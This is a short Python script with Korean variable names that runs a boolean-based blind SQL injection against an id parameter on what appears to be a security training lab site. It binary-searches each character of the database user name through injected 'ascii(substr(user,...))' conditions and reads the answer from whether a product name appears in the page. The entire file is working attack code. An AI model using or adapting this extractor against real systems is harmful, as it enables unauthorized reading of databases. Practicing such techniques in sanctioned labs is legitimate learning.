import requests

주소 = "https://lab.eqst.co.kr:8110/practice/practice01/detail?id=61"

쿠키 = {
 "JSESSIONID":"A03A73ABFF72DA805B3AC29E0C52649C"
}

for substr in range(1,9):

    시작점 = 1
    끝점 = 127
    #차수 = 1

    while 시작점 < 끝점:
        중간점 = int((시작점 + 끝점) / 2)
        공격쿼리 = f"ascii(substr(user,{substr},1)) > {중간점}"
        공격주소 = 주소 + " and " + 공격쿼리
        응답 = requests.get(url=공격주소, cookies=쿠키)
        

        #print(f"{차수}차. {시작점}~{끝점} // 아스키>{중간점}")
        if "애플워치" in 응답.text:
            시작점 = 중간점 + 1
        else:
            끝점 = 중간점
       #차수=차수+1    
    print(f"{substr}번째 글자 {chr(끝점)}이거 맞지?")